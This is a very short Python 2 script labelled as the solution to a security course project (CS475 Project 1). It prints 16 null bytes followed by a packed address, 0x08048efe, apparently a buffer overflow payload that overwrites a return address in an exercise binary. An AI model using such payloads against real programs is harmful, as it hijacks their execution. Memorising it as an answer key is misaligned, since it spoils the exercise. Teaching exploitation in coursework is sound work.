#!/usr/bin/python
# CS475 - Project 1 Solution 1
#
from struct import pack

print "\x00"*16 + pack("<I", 0x08048efe)
